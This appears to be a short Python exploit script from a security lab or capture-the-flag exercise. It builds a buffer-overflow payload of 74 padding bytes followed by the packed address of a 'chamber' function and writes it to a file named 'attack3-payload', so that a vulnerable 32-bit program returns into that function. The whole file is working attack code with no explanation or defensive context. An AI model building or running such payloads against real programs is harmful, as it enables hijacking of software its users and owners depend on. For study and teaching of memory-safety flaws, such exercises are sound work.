import struct

# Setting the padding size 
padding_size = 74

# Address of chamber function
chamber_address = 0x56556288
# Packing the chamber function address
chamber_address_packed = struct.pack("<I",chamber_address)

#----------------------------
# Creating the payload
#----------------------------
# Adding the padding to the payload
payload = b'A'*padding_size
# Writing the address of the chamber function to the payload
payload += chamber_address_packed

# Write into the attack3-payload file
with open("attack3-payload", "wb") as f:
        f.write(payload)

